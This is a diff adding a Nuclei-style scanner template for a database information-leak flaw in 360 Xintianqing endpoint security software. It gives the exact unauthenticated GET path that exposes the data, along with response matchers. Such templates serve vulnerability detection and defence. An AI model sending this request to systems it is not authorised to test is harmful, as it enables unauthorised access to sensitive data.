@@ -1,0 +1,24 @@
+id: 360-xintianqing-ccid-info-leak
+
+info:
+  name: 360 新天擎终端安全管理系统存在数据库信息泄露漏洞
+  author: Ashro
+  description: 360 新天擎终端安全管理系统中，/api/dp/rptsvcsyncpoint?ccid=1文件可能会泄露敏感信息。
+  reference:
+    - https://example.com/reference-to-vulnerability
+  severity: high
+  tags: info-leak
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/dp/rptsvcsyncpoint?ccid=1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "client"
+      - type: status
+        status:
+          - 200
